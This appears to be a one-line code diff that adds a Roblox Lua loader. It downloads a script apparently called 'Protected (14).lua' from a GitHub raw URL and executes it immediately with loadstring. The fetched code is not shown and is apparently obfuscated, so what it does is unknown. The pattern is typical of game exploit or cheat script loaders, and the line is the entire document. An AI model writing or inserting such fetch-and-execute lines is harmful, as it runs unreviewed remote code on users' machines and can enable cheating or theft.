@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vstaxds/newgui/main/Protected%20(14).lua'))()
